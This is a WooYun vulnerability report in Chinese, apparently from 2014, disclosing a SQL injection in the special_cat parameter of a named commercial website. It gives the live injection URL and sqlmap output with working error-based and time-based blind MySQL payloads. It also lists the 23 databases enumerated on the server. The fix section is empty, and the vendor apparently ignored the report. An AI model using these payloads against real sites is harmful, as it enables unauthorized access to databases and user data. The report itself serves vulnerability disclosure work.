wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-09-23：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-11-07：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 买个小东西，突然发现了洞洞一枚哎....来份小礼物吧。。。 详细说明：  注入地址：http://o2o.homevv.com/jpl_special/?special_cat=4

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: special_cat    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: special_cat=4 AND (SELECT 9135 FROM(SELECT COUNT(*),CONCAT(0x3a6e67713a,(SELECT (CASE WHEN (9135=9135) THEN 1 ELSE 0 END)),0x3a7268623a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: special_cat=4 AND SLEEP(5)---available databases [23]:[*] dz[*] dz2[*] dz3[*] dz4[*] dz5[*] ec[*] homevv6[*] hoorayos[*] information_schema[*] jpl[*] jpl2[*] jpl3[*] jpl4[*] mysql[*] oatest[*] performance_schema[*] piwik[*] piwik1[*] t1[*] test[*] test2[*] ucenter[*] ultrax06   漏洞证明：     修复方案：     版权声明：转载请注明来源 AuGe@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
